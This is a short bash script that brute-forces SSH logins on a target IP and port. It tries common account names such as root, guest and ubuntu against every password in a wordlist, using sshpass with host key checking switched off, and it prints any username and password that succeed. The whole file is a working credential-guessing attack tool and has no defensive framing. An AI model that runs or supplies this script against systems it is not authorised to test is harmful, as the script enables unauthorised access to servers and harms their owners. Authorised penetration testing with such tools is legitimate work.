#!/bin/bash
# Before start you need to have sshpass
# You can install it with: sudo apt install sshpass -y

# Define the target ip and port
TARGET=${1}
PORT=${2}

# Define common usernames
USERNAMES=("root"  "guest" "backup"  "ubuntu"  "centos")
PASSWORD_FILE="passwords.txt"

echo "Starting SSH credential testing..."

# Loop over usernames
for user in "${USERNAMES[@]}"; do
	while IFS= read -r pass; do
		echo "Testing: ${user} - ${pass}"
		# Check if access is granted
		if sshpass -p "${pass}" ssh -o "StrictHostKeyChecking=no" -p "${PORT}" "${user}@${TARGET}" exit >/dev/null 2>&1; then
			echo "Successful login!"
			echo "Username: ${user}"
			echo "Password: ${pass}"
			exit 0
		fi
		done < "${PASSWORD_FILE}"
done

echo "No valid credentials found"
